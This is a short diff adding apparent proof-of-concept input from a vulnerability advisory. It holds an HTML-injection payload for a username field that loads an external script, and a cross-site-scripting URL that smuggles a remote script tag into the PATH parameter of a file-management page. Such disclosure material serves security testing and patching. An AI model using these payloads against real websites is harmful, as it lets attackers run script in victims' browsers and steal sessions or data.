@@ -1,0 +1,5 @@
+For the HTML-injection issue:
+username: &lt;/script&gt;&lt;script src=&quot;//www.example.com&quot;&gt;&lt;/script&gt;&lt;script&gt;
+
+For the cross-site-scripting issue:
+http://example.com/private/file_management.ssi?PATH=/etc&quot;&gt;&lt;script%20src=&quot;http://www.example.com&quot;&gt;&lt;/script&gt;
